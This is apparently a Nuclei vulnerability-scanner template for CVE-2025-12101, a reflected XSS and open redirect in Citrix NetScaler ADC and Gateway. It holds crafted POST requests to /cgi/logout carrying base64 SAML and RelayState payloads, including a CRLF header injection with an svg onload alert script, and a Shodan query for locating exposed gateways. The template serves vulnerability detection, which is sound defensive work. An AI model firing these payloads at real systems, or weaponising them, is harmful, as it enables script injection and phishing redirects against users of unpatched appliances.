flow: javascript() || http()
http:
- matchers:
  - condition: and
    dsl:
    - status_code == 302
    - contains(location, 'https://scanme.sh')
    name: open-redirect
    type: dsl
  raw:
  - 'POST /cgi/logout HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    SAMLResponse=PD94bWwgdmVyc2lvbj0iMS4wIj8%2BPHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIElEPSJ0ZXN0IiBWZXJzaW9uPSIyLjAiPjxzYW1sOkFzc2VydGlvbiB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiBJRD0idGVzdCIgVmVyc2lvbj0iMi4wIj48c2FtbDpTdWJqZWN0PjxzYW1sOk5hbWVJRD50ZXN0QGV4YW1wbGUuY29tPC9zYW1sOk5hbWVJRD48L3NhbWw6U3ViamVjdD48L3NhbWw6QXNzZXJ0aW9uPjwvc2FtbHA6UmVzcG9uc2U%2B&RelayState=aHR0cHM6Ly9zY2FubWUuc2g=

    '
id: CVE-2025-12101
info:
  author: DhiyaneshDK,watchtowr
  description: 'Cross-Site Scripting (XSS) in NetScaler ADC and NetScaler Gateway
    when the appliance is configured as a Gateway (VPN virtual server, ICA Proxy,
    CVPN, RDP Proxy) OR AAA virtual server.

    '
  impact: 'Attackers can execute JavaScript in victim browsers or redirect users to
    malicious sites through crafted SAML responses in Citrix NetScaler Gateway configurations.

    '
  metadata:
    max-request: 1
    product: netscaler_application_delivery_controller
    shodan-query: http.title:"citrix gateway"
    vendor: citrix
    verified: true
  name: Citrix NetScaler ADC & Gateway - Reflected XSS / Open Redirect
  reference:
  - https://labs.watchtowr.com/is-it-citrixbleed4-well-no-is-it-good-also-no-citrix-netscalers-memory-leak-rxss-cve-2025-12101/?1
  remediation: 'Apply the latest Citrix security patches that properly sanitize SAML
    response handling in NetScaler ADC and Gateway.

    '
  severity: medium
  tags: cve,cve2025,citrix,xss,js
javascript:
- args:
    Host: '{{Host}}'
    Port: 443
  code: "let net = require(\"nuclei/net\");\n\nlet body = \"SAMLResponse=PD94bWwgdmVyc2lvbj0iMS4wIj8%2BPHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIElEPSJ0ZXN0IiBWZXJzaW9uPSIyLjAiPjxzYW1sOkFzc2VydGlvbiB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiBJRD0idGVzdCIgVmVyc2lvbj0iMi4wIj48c2FtbDpTdWJqZWN0PjxzYW1sOk5hbWVJRD50ZXN0QGV4YW1wbGUuY29tPC9zYW1sOk5hbWVJRD48L3NhbWw6U3ViamVjdD48L3NhbWw6QXNzZXJ0aW9uPjwvc2FtbHA6UmVzcG9uc2U%2B&RelayState=DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KDQoNCjxzdmcvb25sb2FkPWFsZXJ0KGRvY3VtZW50LmRvbWFpbik%2b\"\
    ;\n\nlet request = `POST /cgi/logout HTTP/1.1\\r\\n`;\nrequest += `Host: ${Host}\\\
    r\\n`;\nrequest += `Content-Type: application/x-www-form-urlencoded\\r\\n`;\n\
    request += `Content-Length: ${body.length}\\r\\n`;\nrequest += `\\r\\n`;\nrequest\
    \ += body;\n\nlet conn = net.OpenTLS('tcp', `${Host}:${Port}`);\nconn.Send(request);\n\
    \nlet response = conn.RecvString();\nconn.Close();\n\nlet statusMatch = response.match(/HTTP\\\
    /\\d\\.\\d\\s+(\\d+)/);\nlet statusCode = statusMatch ? parseInt(statusMatch[1])\
    \ : 0;\n\nlet hasXSSPayload = response.includes('<svg/onload=alert(document.domain)>');\n\
    \nif (statusCode === 302 && hasXSSPayload) {\n  Export(response);\n}\n"
  matchers:
  - dsl:
    - success == true
    name: xss
    type: dsl
